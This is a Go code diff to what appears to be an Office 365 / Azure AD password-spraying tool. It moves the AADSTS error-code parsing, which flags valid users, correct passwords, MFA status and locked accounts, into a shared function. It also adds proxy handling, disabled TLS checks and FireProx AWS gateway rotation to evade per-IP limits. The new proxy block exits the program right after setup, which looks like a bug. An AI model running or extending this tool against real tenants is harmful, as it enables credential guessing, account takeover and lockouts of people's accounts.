@@ -15,15 +15,23 @@ package main
 import (
 	"bufio"
 	"bytes"
+	"context"
+	"crypto/tls"
 	"encoding/json"
 	"flag"
 	"fmt"
 	"io"
+	"log"
 	"math/rand"
+	"net"
 	"net/http"
+	"net/url"
 	"os"
+	"os/signal"
 	"regexp"
+	"slices"
 	"strings"
+	"syscall"
 	"time"
 
 	"github.com/beevik/etree"
@@ -38,11 +46,28 @@ var (
 	targetURLgraph = "https://login.microsoft.com/common/oauth2/token"
 	debug          = false
 	outFile        *os.File
+	httpClient     *http.Client
+	fireprox       bool
+	fp             *FireProx
 )
+
+func exitFunc() {
+	fmt.Println(color.RedString("\n[!] Exiting..."))
+	if fireprox {
+		fmt.Println(color.RedString("\n[!] Cleaning up AWS Gateway..."))
+		// Do some cleanup
+		err := fp.DeleteAPI()
+		if err != nil {
+			fmt.Println(color.RedString("[!] Error deleting API: " + err.Error()))
+		}
+	}
+	os.Exit(1)
+}
 
 func doError(er ...string) {
 	fmt.Println(strings.Join(er, "\n"))
-	os.Exit(0)
+	//exitFunc()
+	os.Exit(1)
 }
 
 func doWritefile(content string) {
@@ -123,6 +148,7 @@ type flagVars struct {
 	flagAWSGatewayURL string
 	flagDebug         bool
 	flagcloud         string
+	flagFireprox      bool
 }
 
 func flagOptions() *flagVars {
@@ -142,6 +168,7 @@ func flagOptions() *flagVars {
 	flagAWSGatewayURL := flag.String("url", "", "")
 	flagDebug := flag.Bool("debug", false, "")
 	flagcloud := flag.String("cloud", "com", "")
+	flagFireprox := flag.Bool("fireprox", false, "")
 	flag.Parse()
 	return &flagVars{
 		flagHelp:          *flagHelp,
@@ -160,6 +187,7 @@ func flagOptions() *flagVars {
 		flagAWSGatewayURL: *flagAWSGatewayURL,
 		flagDebug:         *flagDebug,
 		flagcloud:         *flagcloud,
+		flagFireprox:      *flagFireprox,
 	}
 }
 
@@ -212,33 +240,9 @@ func doTheStuffGraph(un, pw, prox string) string {
 
 	x := fmt.Sprintf("%v", data["error_codes"])
 
-	if strings.Contains(x, "50059") {
-		doError(color.RedString("[graph] [-] Domain not found in o365 directory. Exiting..."))
-	} else if strings.Contains(x, "50034") {
-		returnString = color.RedString("[graph] [-] User not found: " + un)
-	} else if strings.Contains(x, "50126") {
-		returnString = color.YellowString("[graph] [-] Valid user, but invalid password: " + un + " : " + pw)
-	} else if strings.Contains(x, "50055") {
-		returnString = color.MagentaString("[graph] [!] Valid user, expired password: " + un + " : " + pw)
-	} else if strings.Contains(x, "50056") {
-		returnString = color.YellowString("[graph] [!] User exists, but unable to determine if the password is correct: " + un + " : " + pw)
-	} else if strings.Contains(x, "50053") {
-		returnString = color.MagentaString("[graph] [-] Account locked out: " + un)
-	} else if strings.Contains(x, "50057") {
-		returnString = color.MagentaString("[graph] [-] Account disabled: " + un)
-	} else if strings.Contains(x, "50076") {
-		returnString = color.GreenString("[graph] [+] Possible valid login, MFA required. " + un + " : " + pw)
-	} else if strings.Contains(x, "50079") {
-		returnString = color.GreenString("[graph] [+] Valid login, user must enroll in MFA. " + un + " : " + pw)
-	} else if strings.Contains(x, "53004") {
-		returnString = color.GreenString("[graph] [+] Possible valid login, user must enroll in MFA. " + un + " : " + pw)
-	} else if strings.Contains(x, "") {
-		returnString = color.GreenString("[graph] [+] Possible valid login! " + un + " : " + pw)
-	} else {
-		returnString = color.MagentaString("[graph] [!] Unknown response, run with -debug flag for more information. " + un + " : " + pw)
-	}
+	returnString = resStatus(un, pw, x)
 	if debug {
-		returnString = returnString + "\nDebug: " + string(body)
+		returnString = returnString + "\n" + x + "\n" + string(body)
 	}
 	return returnString
 }
@@ -289,38 +293,45 @@ func doTheStuffRst(un, pw, prox string) string {
 	// Read response codes
 	// looks for the "psf:text" field within the XML response
 	x := xmlResponse.FindElement("//psf:text")
-	if x == nil {
-		returnString = color.GreenString("[rst] [+] Possible valid login! " + un + " : " + pw)
-		// if the "psf:text" field doesn't exist, that means no AADSTS error code was returned indicating a valid login
-	} else if strings.Contains(x.Text(), "AADSTS50059") {
-		// if the domain is not in the directory then exit
-		doError(color.RedString("[rst] [-] Domain not found in o365 directory. Exiting..."))
-	} else if strings.Contains(x.Text(), "AADSTS50034") {
-		returnString = color.RedString("[rst] [-] User not found: " + un)
-	} else if strings.Contains(x.Text(), "AADSTS50126") {
-		returnString = color.YellowString("[rst] [-] Valid user, but invalid password: " + un + " : " + pw)
-	} else if strings.Contains(x.Text(), "AADSTS50055") {
-		returnString = color.MagentaString("[rst] [!] Valid user, expired password: " + un + " : " + pw)
-	} else if strings.Contains(x.Text(), "AADSTS50056") {
-		returnString = color.YellowString("[rst] [!] User exists, but unable to determine if the password is correct: " + un + " : " + pw)
-	} else if strings.Contains(x.Text(), "AADSTS50053") {
-		returnString = color.MagentaString("[rst] [-] Account locked out: " + un)
-	} else if strings.Contains(x.Text(), "AADSTS50057") {
-		returnString = color.MagentaString("[rst] [-] Account disabled: " + un)
-	} else if strings.Contains(x.Text(), "AADSTS50076") {
-		returnString = color.GreenString("[rst] [+] Possible valid login, MFA required. " + un + " : " + pw)
-	} else if strings.Contains(x.Text(), "AADSTS50079") {
-		returnString = color.GreenString("[rst] [+] Valid login, user must enroll in MFA. " + un + " : " + pw)
-	} else if strings.Contains(x.Text(), "AADSTS53004") {
-		returnString = color.GreenString("[rst] [+] Possible valid login, user must enroll in MFA. " + un + " : " + pw)
-	} else {
-		returnString = color.MagentaString("[rst] [!] Unknown response, run with -debug flag for more information. " + un + " : " + pw)
-	}
+	returnString = resStatus(un, pw, x.Text())
+
 	if debug {
 		returnString = returnString + "\n" + x.Text() + "\n" + string(body)
 	}
 	return returnString
 }
+
+func resStatus(un, pw string, status string) string {
+	if len(status) == 0 {
+		return color.GreenString("[+] Possible valid login! " + un + " : " + pw)
+	} else if strings.Contains(status, "50126") {
+		return color.YellowString("[-] Valid user, but invalid password: " + un + " : " + pw)
+	} else if strings.Contains(status, "50055") {
+		return color.MagentaString("[-] Valid user, expired password: " + un + " : " + pw)
+	} else if strings.Contains(status, "50056") {
+		return color.YellowString("[-] User exists, but unable to determine if the password is correct: " + un + " : " + pw)
+	} else if strings.Contains(status, "50053") {
+		return color.MagentaString("[-] Account locked out: " + un)
+	} else if strings.Contains(status, "50057") {
+		return color.MagentaString("[-] Account disabled: " + un)
+	} else if strings.Contains(status, "50076") {
+		return color.GreenString("[+] Possible valid login, MFA required. " + un + " : " + pw)
+	} else if strings.Contains(status, "50079") {
+		return color.GreenString("[+] Possible Valid login, user must enroll in MFA. " + un + " : " + pw)
+	} else if strings.Contains(status, "53004") {
+		return color.GreenString("[+] Possible valid login, user must enroll in MFA. " + un + " : " + pw)
+	} else if strings.Contains(status, "50034") {
+		return color.RedString("[-] User not found: " + un)
+	} else if strings.Contains(status, "50059") {
+		return color.RedString("[-] Domain not found in o365 directory. Exiting...")
+	} else {
+		return color.MagentaString("[!] Unknown response, run with -debug flag for more information. " + un + " : " + pw)
+	}
+}
+
+// func init() {
+// 	opt := flagOptions()
+// }
 
 func main() {
 	var domain string
@@ -334,6 +345,48 @@ func main() {
 	rand.New(rand.NewSource(time.Now().UnixNano()))
 	opt := flagOptions()
 
+	signalChan := make(chan os.Signal, 1)
+	signal.Notify(signalChan, syscall.SIGINT, syscall.SIGTERM)
+
+	// Run a goroutine to handle graceful shutdown
+	go func() {
+		<-signalChan // Wait for signal
+		exitFunc()   // Call custom exit function
+	}()
+
+	transport := &http.Transport{
+		Proxy: http.ProxyFromEnvironment, // Default to environment proxy if no flag provided
+		// Bypass TLS verification for testing through Burp Suite
+		TLSClientConfig: &tls.Config{
+			InsecureSkipVerify: true,
+		},
+	}
+	// -proxy
+	if opt.flagProxy != "" {
+		proxyList = append(proxyList, opt.flagProxy)
+		proxyURL, err := url.Parse(opt.flagProxy)
+		if err != nil || !slices.Contains([]string{"socks5", "http", "https"}, proxyURL.Scheme) {
+			doError(color.RedString("Invalid proxy URL : " + proxyURL.String()))
+		} else if proxyURL.Scheme == "socks5" {
+			dialer, err := proxy.SOCKS5("tcp", proxyURL.Host, nil, proxy.Direct)
+			if err != nil {
+				log.Fatalf("Error creating SOCKS5 proxy dialer: %v", err)
+			}
+			transport.DialContext = func(ctx context.Context, network, addr string) (net.Conn, error) {
+				return dialer.Dial(network, addr)
+			}
+		} else if proxyURL.Scheme == "http" || proxyURL.Scheme == "https" {
+			transport.Proxy = http.ProxyURL(proxyURL)
+		}
+		fmt.Println(color.CyanString("[i] Optional proxy configured: " + opt.flagProxy))
+
+		// Create the HTTP client with the transport and timeout
+		httpClient = &http.Client{
+			Transport: transport,
+			Timeout:   30 * time.Second,
+		}
+		os.Exit(0)
+	}
 	//-h
 	if opt.flagHelp {
 		doError(usage)
@@ -422,11 +475,6 @@ func main() {
 			doError(color.RedString(err.Error()))
 		}
 	}
-	// -proxy
-	if opt.flagProxy != "" {
-		proxyList = append(proxyList, opt.flagProxy)
-		fmt.Println(color.CyanString("[i] Optional proxy configured: " + opt.flagProxy))
-	}
 	// -proxyfile
 	if opt.flagProxyFile != "" {
 		proxyFile, err := os.Open(opt.flagProxyFile)
@@ -494,6 +542,17 @@ func main() {
 		return // Exit if no valid endpoint was specified
 	}
 	color.Unset()
+
+	if opt.flagFireprox {
+		fireprox = true
+		regions := []string{"us-east-1"}
+		fp, err = NewFireProx(regions[0], "", targetURL)
+		if err != nil {
+			fmt.Println(color.RedString("[!] Error initializing FireProx: " + err.Error()))
+			os.Exit(1)
+		}
+	}
+
 	// -debug
 	debug = opt.flagDebug
 
@@ -517,7 +576,7 @@ func main() {
 			result := ""
 			proxyInput := ""
 
-			if opt.flagProxyFile != "" {
+			if opt.flagProxyFile != "" || proxyList != nil {
 				proxyInput = "bp"
 				for {
 					proxyInput = randomProxy(proxyList)
